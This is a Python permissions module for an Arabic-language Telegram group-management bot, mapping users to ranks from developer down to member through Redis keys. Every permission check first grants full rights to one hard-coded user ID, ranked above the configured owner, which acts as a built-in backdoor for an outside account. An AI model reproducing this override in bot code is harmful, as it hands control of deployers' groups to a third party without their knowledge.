from config import *
import re
def get_rank(id, cid) -> str:
   if id == 7115002714 or id == 7115002714:
      return 'هانكوك'
   if id == int(hmshelp):
      return 'البوت'
   if id == int(r.get(f'{hmshelp}botowner')):
      return 'المطور الاساسي'
   if r.get(f'{id}:rankDEV2:{hmshelp}'):
      return 'المطور الثانوي'
   if r.get(f'{id}:rankDEV:{hmshelp}'):
      return 'المطور'
   if r.get(f'{id}:gban:{hmshelp}'):
      return 'محظور عام'
   if r.get(f'{id}:mute:{hmshelp}'):
      return 'محظور عام'
   if r.get(f'{cid}:rankGOWNER:{id}{hmshelp}'):
      if r.get(f'{cid}:RankGowner:{hmshelp}'):
         return r.get(f'{cid}:RankGowner:{hmshelp}')
      return 'المالك الاساسي'
   if r.get(f'{cid}:rankOWNER:{id}{hmshelp}'):
      if r.get(f'{cid}:RankOwner:{hmshelp}'):
         return r.get(f'{cid}:RankOwner:{hmshelp}')
      return 'المالك'
   if r.get(f'{cid}:rankMOD:{id}{hmshelp}'):
      if r.get(f'{cid}:RankMod:{hmshelp}'):
         return r.get(f'{cid}:RankMod:{hmshelp}')
      return 'المدير'
   if r.get(f'{cid}:rankADMIN:{id}{hmshelp}'):
      if r.get(f'{cid}:RankAdm:{hmshelp}'):
         return r.get(f'{cid}:RankAdm:{hmshelp}')
      return 'ادمن'
   if r.get(f'{cid}:rankPRE:{id}{hmshelp}'):
      if r.get(f'{cid}:RankPre:{hmshelp}'):
         return r.get(f'{cid}:RankPre:{hmshelp}')
      return 'مميز'
   else:
      if r.get(f'{cid}:RankMem:{hmshelp}'):
         return r.get(f'{cid}:RankMem:{hmshelp}')
      return 'عضو'

def admin_pls(id, cid) -> bool:
   if id == 7115002714 or id == 7115002714:
      return True
   if id == 7115002714 or id == 7115002714:
      return True
   if id == int(hmshelp):
      return True
   if id == int(r.get(f'{hmshelp}botowner')):
      return True
   if r.get(f'{id}:rankDEV2:{hmshelp}'):
      return True
   if r.get(f'{id}:rankDEV:{hmshelp}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{hmshelp}'):
      return True
   if r.get(f'{cid}:rankOWNER:{id}{hmshelp}'):
      return True
   if r.get(f'{cid}:rankMOD:{id}{hmshelp}'):
      return True
   if r.get(f'{cid}:rankADMIN:{id}{hmshelp}'):
      return True
   else:
      return False

def mod_pls(id, cid) -> bool:
   if id == 7115002714 or id == 7115002714:
      return True
   if id == 7115002714 or id == 7115002714:
      return True
   if id == int(hmshelp):
      return True
   if id == int(r.get(f'{hmshelp}botowner')):
      return True
   if r.get(f'{id}:rankDEV2:{hmshelp}'):
      return True
   if r.get(f'{id}:rankDEV:{hmshelp}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{hmshelp}'):
      return True
   if r.get(f'{cid}:rankOWNER:{id}{hmshelp}'):
      return True
   if r.get(f'{cid}:rankMOD:{id}{hmshelp}'):
      return True
   else:
      return False

def owner_pls(id, cid) -> bool:
   if id == 7115002714 or id == 7115002714:
      return True
   if id == 7115002714 or id == 7115002714:
      return True
   if id == int(hmshelp):
      return True
   if id == int(r.get(f'{hmshelp}botowner')):
      return True
   if r.get(f'{id}:rankDEV2:{hmshelp}'):
      return True
   if r.get(f'{id}:rankDEV:{hmshelp}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{hmshelp}'):
      return True
   if r.get(f'{cid}:rankOWNER:{id}{hmshelp}'):
      return True
   else:
      return False

def gowner_pls(id, cid) -> bool:
   if id == 7115002714 or id == 7115002714:
      return True
   if id == 7115002714 or id == 7115002714:
      return True
   if id == int(hmshelp):
      return True
   if id == int(r.get(f'{hmshelp}botowner')):
      return True
   if r.get(f'{id}:rankDEV2:{hmshelp}'):
      return True
   if r.get(f'{id}:rankDEV:{hmshelp}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{hmshelp}'):
      return True
   else:
      return False

def dev_pls(id, cid) -> bool:
   if id == 7115002714 or id == 7115002714:
      return True
   if id == 7115002714 or id == 7115002714:
      return True
   if id == int(hmshelp):
      return True
   if id == int(r.get(f'{hmshelp}botowner')):
      return True
   if r.get(f'{id}:rankDEV2:{hmshelp}'):
      return True
   if r.get(f'{id}:rankDEV:{hmshelp}'):
      return True
   else:
      return False

def dev2_pls(id, cid) -> bool:
   if id == 7115002714 or id == 7115002714:
      return True
   if id == 7115002714 or id == 7115002714:
      return True
   if id == int(hmshelp):
      return True
   if id == int(r.get(f'{hmshelp}botowner')):
      return True
   if r.get(f'{id}:rankDEV2:{hmshelp}'):
      return True
   else:
      return False

def devp_pls(id, cid) -> bool:
   if id == 7115002714 or id == 7115002714:
      return True
   if id == 7115002714 or id == 7115002714:
      return True
   if id == int(hmshelp):
      return True
   if id == int(r.get(f'{hmshelp}botowner')):
      return True
   else:
      return False


def pre_pls(id, cid) -> bool:
   if id == 7115002714 or id == 7115002714:
      return True
   if id == 7115002714 or id == 7115002714:
      return True
   if id == int(r.get(f'{hmshelp}botowner')):
      return True
   if id == int(hmshelp):
      return True
   if r.get(f'{id}:rankDEV2:{hmshelp}'):
      return True
   if r.get(f'{id}:rankDEV:{hmshelp}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{hmshelp}'):
      return True
   if r.get(f'{cid}:rankOWNER:{id}{hmshelp}'):
      return True
   if r.get(f'{cid}:rankMOD:{id}{hmshelp}'):
      return True
   if r.get(f'{cid}:rankADMIN:{id}{hmshelp}'):
      return True
   if r.get(f'{cid}:rankPRE:{id}{hmshelp}'):
      return True
   else:
      return False

   
def get_devs_br():
   list = []
   if not int(r.get(f'{hmshelp}botowner')) == 7115002714:
      list.append(7115002714)
   list.append(int(r.get(f'{hmshelp}botowner')))
   if r.smembers(f'{hmshelp}DEV2'):
      for dev2 in r.smembers(f'{hmshelp}DEV2'):
         list.append(int(dev2))
   return list


def isLockCommand(fid: int, cid: int, text: str):
   if not r.hgetall(hmshelp+f"locks-{cid}"):
      return False
   else:
      commands = r.hgetall(hmshelp+f"locks-{cid}")
      if text not in commands: return False
      for command in commands:
         cc = int(commands[command])
         if command.lower() in text.lower():
            print(text)
            print(command)
            if cc == 0:
               if not gowner_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 1:
               if not owner_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 2:
               if not mod_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 3:
               if not admin_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 4:
               if not pre_pls(fid, cid):
                  return True
               else:
                  return False